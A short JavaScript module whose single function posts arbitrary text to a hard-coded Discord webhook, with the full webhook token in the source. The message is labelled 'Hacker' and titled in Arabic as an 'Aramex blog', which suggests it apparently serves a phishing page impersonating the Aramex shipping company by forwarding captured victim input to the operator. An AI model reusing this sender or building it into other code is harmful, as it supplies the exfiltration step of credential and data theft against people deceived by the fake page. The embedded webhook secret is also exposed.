import axios from 'axios';


const TeleSned = () => {
     
    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة اراميكس ",
              description: des,
           },
          ],
    };

        await axios.post("https://discord.com/api/webhooks/1316439624754790450/f3XYP0BGeLGWxTOp_Fv8lBT-Brv7dIpyjcJPRtUygsxiIj46S9-_gXJ3-MhLY_i2R3Eh",body) 
    }
  return {
    Send,
}
}

export default TeleSned;
